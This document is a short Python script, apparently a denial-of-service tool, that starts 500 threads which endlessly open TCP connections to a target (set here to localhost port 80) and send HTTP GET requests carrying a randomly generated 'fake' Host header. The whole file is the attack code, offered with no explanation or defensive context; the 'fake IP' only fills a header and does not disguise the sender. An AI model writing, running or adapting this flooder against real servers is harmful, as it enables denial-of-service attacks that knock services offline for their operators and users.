import socket
import random
import threading

target = '127.0.0.1'
port = 80
fake_ip = '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))

def ddos_attack():
   while True:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect((target, port))
       s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
       s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
       s.close()

for _ in range(500):
   thread = threading.Thread(target=ddos_attack)
   thread.start()